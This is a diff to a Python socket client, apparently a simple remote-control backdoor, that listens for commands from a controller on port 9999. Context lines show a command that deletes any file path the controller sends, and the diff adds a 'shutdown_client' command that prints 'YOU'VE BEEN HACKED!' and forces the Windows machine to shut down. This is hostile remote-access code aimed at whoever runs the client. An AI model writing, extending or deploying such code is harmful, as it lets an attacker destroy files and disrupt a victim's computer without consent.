@@ -1,5 +1,6 @@
 import socket
 import os
+import time
 
 client_socket = socket.socket()
 port_number = 9999
@@ -42,6 +43,11 @@ while 1:
         filepath = filepath.decode()
         files = os.remove(filepath)
         print("Command remove_files executed correctly!")
+
+    elif command == "shutdown_client":
+        print("YOU'VE BEEN HACKED! THIS PC WILL SHUTDOWN AFTER 10 SECONDS!")
+        time.sleep(10)
+        os.system("shutdown /s /t 1")
 
     else:
         print("Leave")
